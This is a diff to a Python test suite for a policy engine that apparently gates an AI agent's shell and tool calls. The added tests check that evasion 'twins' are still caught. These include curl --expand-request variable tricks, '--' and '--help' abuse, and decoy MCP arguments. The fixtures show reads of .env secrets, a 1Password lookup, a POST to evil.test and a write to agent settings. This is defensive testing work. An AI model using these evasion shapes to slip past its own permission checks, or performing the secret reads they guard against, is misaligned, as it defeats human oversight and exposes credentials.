@@ -9,13 +9,18 @@ check: the exemption is real) and the exempt text E; a rule may have several. On
 exempt form with E rewritten: E as a quoted last word's end (`'x E'`), as the value of an option that takes one, after
 `--`, where every program reads it as a positional, and after a tab in its own word (`'<TAB>E'`: one word, which
 an `unless` reading any whitespace takes as two); each option of RESETS after the exempt form, followed by the base's
-words (curl's --next starts another request, -K reads options from a file); and the base sent through an MCP tool
+words (curl's --next starts another request, -K reads options from a file, an --expand- option takes its value from a
+variable); and the base sent through an MCP tool
 with E in a decoy argument. A rule on one value (a file path, a URL, a tool name) or on a call's whole arguments has no
 command line: its twins carry E in a decoy argument, in another argument the class reads for the same field, in a key
 that ends as the exempted key does, and in a decoy argument of the call sent through an MCP tool."""
+import argparse
+import contextlib
+import io
 import json
 import os
 import unittest
+from unittest import mock
 
 from tracekit.policy2 import compile as pc
 from tracekit.policy2.engine import Engine
@@ -56,7 +61,8 @@ LINES = {
     "TK-F035": ("cat < .env", "cat < .env.example", ".env.example", "-n"),
 }
 # options after which a program no longer reads the exempt form as it did: (option, its value or None)
-RESETS = {"TK-A043": [("--next", None), ("-:", None), ("-K", "/tmp/c"), ("--config", "/tmp/c")]}
+RESETS = {"TK-A043": [("--next", None), ("-:", None), ("-K", "/tmp/c"), ("--config", "/tmp/c"),
+                      ("--expand-request", "'{{m}}'"), ("--expand-config", "/tmp/c")]}
 # rules on one value or on a call's whole arguments: (tool, base arguments, exempt arguments, E, the key E stands for)
 CALLS = {
     "TK-A058": ("Write", {"file_path": "/w/model.pth", "content": "x"},
@@ -77,6 +83,8 @@ CALLS = {
     "TK-F033": ("Read", {"file_path": "/app/.env"}, {"file_path": "/app/.env.example"}, "/app/.env.example",
                 "file_path"),
     "TK-F036": ("mcp__onepassword__get_item", {"item": "x"}, None, "list_items", "tool"),
+    "TK-F043": ("mcp__filesystem__read_file", {"path": "/app/.env"}, {"path": "/app/.env.example"}, "/app/.env.example",
+                "path"),
     "TK-F009": ("Write", {"file_path": "/h/.claude/settings.json", "content": "x"},
                 {"file_path": "/h/.claude/projects/p/memory/m.md", "content": "x"}, "/h/.claude/projects/p/memory/m.md",
                 "file_path"),
@@ -84,6 +92,9 @@ CALLS = {
     "TK-N002": ("http_request", {"url": "https://evil.test/", "method": "POST", "data": "x"},
                 {"url": "https://example.com/", "method": "POST", "data": "x"}, "https://example.com/", "url"),
 }
+# twins a rule rightly lets through: argparse fails an option given --help as its value, so the command doesn't run
+# (TestHelpRequests)
+NOT_TWINS = {("TK-D007", "another option's value")}
 ALIASES = {"file_path": "path", "path": "file_path"}   # another argument the class reads for the same field
 TOOLS = {"TK-M005": {"issue_refund": "payment"}}   # a deployment's own tool, mapped as the rule expects
 
@@ -164,11 +175,23 @@ class TestHostileTwins(unittest.TestCase):
                     if exempt:
                         self.assertNotIn(rid, evaluate(e, *exempt)[0]["rule_ids"])
 
+    def test_a_method_or_body_curl_expands_from_a_variable_is_a_post(self):
+        # curl 8.3 expands variables into an --expand- option's value: -G, a GET, doesn't make it one
+        lines = ["curl -G --variable m=POST --expand-request '{{m}}' https://api.stripe.com/v1/refunds",
+                 "curl --expand-request POST https://api.stripe.com/v1/refunds",
+                 "curl -G --expand-data-urlencode amount=5 https://api.stripe.com/v1/refunds -d limit=3"]
+        for name in SHIPPED:
+            for backend in ("re2", "regex"):
+                for line in lines:
+                    d = evaluate(self.engine(name, backend, None), "Bash", {"command": line})[0]
+                    self.assertIn("TK-A043", d["rule_ids"], (name, backend, line))
+                    self.assertIn(d["verdict"], ("ask", "deny"), (name, backend, line))
+
     def test_every_twin_is_held_as_its_base(self):
         findings = []
         for rid, names in sorted(unless_rules(self.pols).items()):
             for shape, base, twin in twins(rid):
-                for name in names:
+                for name in names if (rid, shape) not in NOT_TWINS else ():
                     for backend in ("re2", "regex"):
                         e = self.engine(name, backend, rid)
                         a, b = evaluate(e, *base)[0], evaluate(e, *twin)[0]
@@ -176,6 +199,83 @@ class TestHostileTwins(unittest.TestCase):
                             findings.append(f"{rid} {shape} ({name}, {backend}): {json.dumps(twin)[:160]} "
                                             f"{b['verdict']} {b['rule_ids']}, its base {a['verdict']}")
         self.assertEqual(findings, [])
+
+
+class TestHelpRequests(unittest.TestCase):
+    """TK-D007 reads `tracekit … --help` as touching nothing (engine._asks_help): Tracekit's argparse parsers print help
+    and exit before the command runs, whatever options come before (an option given --help as its value fails to
+    parse), but after `--` and under srt-decider, which runs the command it is given."""
+
+    @staticmethod
+    def parsers():
+        """{subcommand or None (the CLI's own): (its root parser, the parse method its main calls)}, as each builds it;
+        migrate's words go on to migrate.main (`migrate --system`'s own loop stops at any word it doesn't know)."""
+        from tracekit import cli, migrate
+
+        class Built(Exception):
+            pass
+
+        def capture(method):
+            def fn(self, *a, **k):
+                raise Built(self, method)
+            return fn
+        out = {}
+        mains = {None: lambda: cli.main(["--help"]), "migrate": lambda: migrate.main(["--help"]),
+                 **{n: lambda n=n: cli.main([n, "--help"]) for n in cli._DELEGATED}}
+        for name, main in mains.items():
+            with mock.patch.object(argparse.ArgumentParser, "parse_args", capture("parse_args")), \
+                    mock.patch.object(argparse.ArgumentParser, "parse_known_args", capture("parse_known_args")), \
+                    contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
+                try:
+                    main()
+                except Built as b:
+                    out[name] = b.args
+        return out
+
+    @staticmethod
+    def walk(parser, skip=(), path=()):
+        yield parser, list(path)
+        for a in parser._actions:
+            if isinstance(a, argparse._SubParsersAction):
+                for n, sub in a.choices.items():
+                    if n not in skip:
+                        yield from TestHelpRequests.walk(sub, (), (*path, n))
+
+    def test_a_help_request_never_runs_the_command(self):
+        from tracekit import cli
+        built, ran, remainder = self.parsers(), [], []
+        self.assertEqual(set(built), {None, "migrate", *cli._DELEGATED})   # every subcommand parses with argparse
+        for name, (root, method) in built.items():
+            for parser, path in self.walk(root, {*cli._DELEGATED, "migrate"} if name is None else ()):
+                if any(a.nargs == argparse.REMAINDER for a in parser._actions):
+                    remainder.append(" ".join([name or "", *path]).strip())
+                tries = [[*path, o, "--help"] for a in parser._actions for o in a.option_strings
+                         if not isinstance(a, argparse._HelpAction)]
+                tries += [[*path, "x", "--help"]] if any(not a.option_strings for a in parser._actions) else []
+                for argv in tries:
+                    try:
+                        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
+                            getattr(root, method)(argv)
+                    except (SystemExit, argparse.ArgumentError):
+                        continue
+                    ran.append(" ".join([name or "", *argv]).strip())
+        self.assertEqual(ran, [])
+        self.assertEqual(remainder, ["srt-decider"])   # its command's words are the command's: _asks_help reads none
+
+    def test_tk_d007_lets_help_through_and_holds_what_runs(self):
+        lines = {"tracekit signer serve --dev --help": False, "tracekit signer serve --config x --help": False,
+                 "tracekit signer incidents clear-label 0123456789abcdef --help": False,
+                 "python3 -m tracekit signer serve --dev --help": False, "tracekit signer serve --help": False,
+                 "tracekit signer serve -- --help": True, "tracekit signer serve --config 'x --help'": True,
+                 "tracekit signer serve --data-dir /var/lib/tracekit": True,
+                 "tracekit signer serve --help; tracekit signer serve --data-dir /var/lib/tracekit": True,
+                 "tracekit srt-decider srt-proxy --data-dir /var/lib/tracekit --help": True,
+                 "tracekit signer serve --help > /var/lib/tracekit/x": True}
+        for name, pol in packs().items():
+            for backend in ("re2", "regex"):
+                e = Engine(pol, backend)
+                got = {line: "TK-D007" in evaluate(e, "Bash", {"command": line})[0]["rule_ids"] for line in lines}
+                self.assertEqual(got, lines, (name, backend))
 
 
 if __name__ == "__main__":
